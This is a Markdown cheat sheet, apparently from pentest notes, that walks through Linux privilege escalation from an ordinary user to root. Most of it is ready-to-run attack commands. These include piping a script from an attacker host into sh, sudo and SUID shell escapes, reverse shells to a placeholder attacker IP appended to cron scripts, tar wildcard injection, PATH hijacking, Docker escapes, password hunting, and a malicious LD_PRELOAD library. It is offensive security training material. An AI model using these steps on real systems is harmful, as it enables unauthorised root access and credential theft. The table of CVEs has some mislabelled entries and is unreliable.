# 🐧 Linux Privilege Escalation

> **Comprehensive Linux PrivEsc from user to root.** Work through these systematically.

---

## Table of Contents
- [Automated Tools](#automated-tools)
- [Sudo Privileges](#sudo-privileges)
- [SUID/SGID Binaries](#suidsgid-binaries)
- [Linux Capabilities](#linux-capabilities)
- [Cron Jobs](#cron-jobs)
- [Writable Files & PATH Hijacking](#writable-files--path-hijacking)
- [NFS no_root_squash](#nfs-no_root_squash)
- [Kernel Exploits](#kernel-exploits)
- [Docker Escape](#docker-escape)
- [Weak Service Configurations](#weak-service-configurations)
- [Password Hunting](#password-hunting)
- [LD_PRELOAD Exploitation](#ld_preload-exploitation)

---

## Automated Tools

Always run automated tools first, then do manual checks for anything they miss:

- [ ] **LinPEAS** (most comprehensive):
  ```bash
  # Transfer to target
  curl http://<attacker>:8000/linpeas.sh | sh
  # Or:
  wget http://<attacker>:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee /tmp/lp.txt
  ```
- [ ] **LinEnum**:
  ```bash
  wget http://<attacker>:8000/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh -t
  ```
- [ ] **Linux Smart Enumeration (lse)**:
  ```bash
  wget http://<attacker>:8000/lse.sh && chmod +x lse.sh && ./lse.sh -l2
  ```
- [ ] **pspy** (monitor processes WITHOUT root — catch cron jobs):
  ```bash
  wget http://<attacker>:8000/pspy64 && chmod +x pspy64 && ./pspy64
  # Watch for commands run as UID=0 (root)
  ```

---

## Sudo Privileges

**Check immediately on every Linux machine:**

- [ ] **What can we sudo?**
  ```bash
  sudo -l
  ```
- [ ] **Interpret the output**:
  ```
  (root) NOPASSWD: /usr/bin/vim       → Can run vim as root, no password
  (ALL) ALL                            → Full sudo
  (root) /usr/bin/python3 /opt/script  → Can run specific script
  ```
- [ ] **GTFOBins lookup**: [https://gtfobins.github.io](https://gtfobins.github.io) → Search the binary
- [ ] **Common sudo escapes**:
  ```bash
  # vim
  sudo vim -c ':!/bin/bash'
  sudo vim -c ':set shell=/bin/bash' -c ':shell'
  
  # nano
  sudo nano
  # Ctrl+R, Ctrl+X → reset; then: /bin/bash
  
  # less / more
  sudo less /etc/passwd
  # Once in less, type: !/bin/bash
  
  # find
  sudo find / -exec /bin/bash \;
  sudo find . -exec /bin/bash -i \;
  
  # python
  sudo python3 -c 'import os; os.system("/bin/bash")'
  
  # awk
  sudo awk 'BEGIN {system("/bin/bash")}'
  
  # nmap (older versions)
  sudo nmap --interactive
  # Then: !sh
  
  # cp (copy files as root)
  sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash
  /tmp/bash -p
  
  # env
  sudo env /bin/bash
  ```
- [ ] **Sudo version exploit** (CVE-2021-4034, CVE-2019-14287):
  ```bash
  sudo --version
  # < 1.8.28 → sudo -u#-1 /bin/bash (bypass user check)
  # < 1.9.5p2 → PwnKit (CVE-2021-4034) / Heap overflow
  ```

---

## SUID/SGID Binaries

- [ ] **Find all SUID files**:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  find / -perm -4000 -type f 2>/dev/null
  ```
- [ ] **Find all SGID files**:
  ```bash
  find / -perm -g=s -type f 2>/dev/null
  find / -perm -2000 -type f 2>/dev/null
  ```
- [ ] **Cross-reference with GTFOBins**: [https://gtfobins.github.io](https://gtfobins.github.io) → Filter by SUID
- [ ] **Common SUID escapes**:
  ```bash
  # bash (if SUID bit is set)
  /bin/bash -p   # -p preserves UID

  # cp
  LFILE=/etc/shadow; /usr/bin/cp "$LFILE" /tmp/shadow; cat /tmp/shadow

  # find
  /usr/bin/find . -exec /bin/bash -p \; -quit

  # perl
  /usr/bin/perl -e 'exec "/bin/bash -p"'

  # python3
  /usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

  # nmap
  /usr/bin/nmap --interactive   # older nmap only
  
  # pkexec (PwnKit CVE-2021-4034)
  # Affects almost all Linux distros - polkit < 0.120
  # https://github.com/ly4k/PwnKit
  ```

---

## Linux Capabilities

- [ ] **Find capabilities**:
  ```bash
  getcap -r / 2>/dev/null
  ```
- [ ] **Common exploitable capabilities**:
  ```bash
  # cap_setuid (python, perl, ruby, etc.)
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  
  # cap_net_bind_service (not directly useful for privesc)
  
  # cap_sys_ptrace (can read process memory)
  
  # cap_dac_override (bypass file read/write restrictions)
  # Can read /etc/shadow, write to any file
  python3 -c 'with open("/etc/shadow") as f: print(f.read())'
  ```
- [ ] **GTFOBins** also covers capabilities

---

## Cron Jobs

- [ ] **Check cron configurations**:
  ```bash
  crontab -l                    # Current user's cron
  sudo crontab -l               # Root cron (if you can)
  cat /etc/crontab              # System cron
  ls -la /etc/cron.*            # Cron directories
  ls -la /var/spool/cron/       # User cron files
  ```
- [ ] **Monitor running processes with pspy** (catch cron scripts):
  ```bash
  ./pspy64    # Watch for /bin/sh -c or commands run by root (uid=0)
  ```
- [ ] **Exploit writable cron script**:
  ```bash
  # If /opt/backup.sh is run by root every minute and you can write to it:
  echo 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1' >> /opt/backup.sh
  ```
- [ ] **Exploit writable PATH in cron**:
  ```bash
  # If cron runs "backup" (no full path) and /tmp is in PATH:
  echo '#!/bin/bash' > /tmp/backup
  echo 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' >> /tmp/backup
  chmod +x /tmp/backup
  # Wait for cron to run
  ```
- [ ] **Wildcard injection in cron** (`tar`, `chown`, `chmod` with `*`):
  ```bash
  # If cron runs: tar czf /backup.tar.gz /var/www/html/*
  # In /var/www/html, create:
  touch -- --checkpoint=1
  touch -- "--checkpoint-action=exec=sh shell.sh"
  echo '#!/bin/bash' > shell.sh
  echo 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' >> shell.sh
  chmod +x shell.sh
  ```

---

## Writable Files & PATH Hijacking

- [ ] **Find world-writable files**:
  ```bash
  find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev"
  ```
- [ ] **Find world-writable directories**:
  ```bash
  find / -writable -type d 2>/dev/null | grep -v "/proc\|/sys\|/dev"
  ```
- [ ] **PATH hijacking** (when SUID binary or sudo script calls a command without full path):
  ```bash
  # Find which directories are in PATH and writable:
  echo $PATH
  
  # If /tmp is writable and before /usr/bin in PATH:
  # Step 1: Create fake binary
  echo '#!/bin/bash' > /tmp/service
  echo '/bin/bash -p' >> /tmp/service
  chmod +x /tmp/service
  
  # Step 2: Modify PATH
  export PATH=/tmp:$PATH
  
  # Step 3: Run the SUID binary that calls "service"
  /usr/local/bin/suid_app
  ```

---

## NFS no_root_squash

- [ ] **Check /etc/exports on target** (if you can read it):
  ```bash
  cat /etc/exports
  # Look for: no_root_squash
  ```
- [ ] **Exploit** (from attacker machine as root):
  ```bash
  # Mount the share
  sudo mkdir /mnt/nfs
  sudo mount -t nfs $IP:/share /mnt/nfs
  
  # Copy bash with SUID bit
  sudo cp /bin/bash /mnt/nfs/bash
  sudo chmod +s /mnt/nfs/bash
  
  # On target machine:
  /mnt_nfs_path/bash -p  # → root!
  ```

---

## Kernel Exploits

> **Last resort** — kernel exploits can crash the system. Use other methods first.

- [ ] **Get kernel version**:
  ```bash
  uname -r
  cat /proc/version
  ```
- [ ] **Search for exploits**:
  ```bash
  searchsploit linux kernel <version>
  # Or online: exploit-db.com, github.com
  ```
- [ ] **Key kernel CVEs**:

| CVE | Name | Kernel | Notes |
|---|---|---|---|
| CVE-2021-4034 | PwnKit | All < 0.120 (polkit) | Very reliable |
| CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 | Heap overflow |
| CVE-2016-5195 | DirtyCow | < 4.8.3 | Race condition |
| CVE-2019-13272 | PTRACE_TRACEME | < 5.1.17 | |
| CVE-2022-0847 | DirtyPipe | 5.8 – 5.16.11 | Very reliable |

---

## Docker Escape

- [ ] **Check if in Docker container**:
  ```bash
  ls /.dockerenv          # File exists → in container
  cat /proc/1/cgroup | grep docker
  ```
- [ ] **Privileged container escape**:
  ```bash
  # If container is privileged (--privileged):
  mount /dev/sda1 /mnt     # Mount host filesystem
  chroot /mnt              # Get root shell on host
  ```
- [ ] **Escape via docker socket**:
  ```bash
  ls -la /var/run/docker.sock    # If accessible from container
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  ```
- [ ] **WritableCgroup escape** (CVE-2019-5736):
  ```bash
  # Complex — see PoC on GitHub
  ```

---

## Weak Service Configurations

- [ ] **Find services running as root**:
  ```bash
  ps aux | grep root
  systemctl list-units --type=service --state=running
  ```
- [ ] **Check service config files for credentials**:
  ```bash
  find /etc -name "*.conf" -exec grep -l "password\|passwd" {} \;
  ```

---

## Password Hunting

- [ ] **Config files**:
  ```bash
  grep -r "password" /etc/ 2>/dev/null | grep -v "#"
  grep -r "password" /var/www/ 2>/dev/null
  ```
- [ ] **History files**:
  ```bash
  cat ~/.bash_history
  cat ~/.mysql_history
  find / -name "*.history" 2>/dev/null
  ```
- [ ] **Scripts with hardcoded creds**:
  ```bash
  find / -name "*.sh" -exec grep -l "password\|passwd" {} \; 2>/dev/null
  ```

---

## LD_PRELOAD Exploitation

If `sudo -l` shows `env_keep+=LD_PRELOAD`:

```bash
# Create malicious shared library
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# Run any sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so <any_allowed_command>
```

---

## 🔗 References

- [GTFOBins](https://gtfobins.github.io)
- [HackTricks — Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings — Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [PEASS-ng (LinPEAS)](https://github.com/carlospolop/PEASS-ng)

---

*[← PrivEsc Hub](./README.md) · [Windows PrivEsc →](./02_windows_privesc.md)*
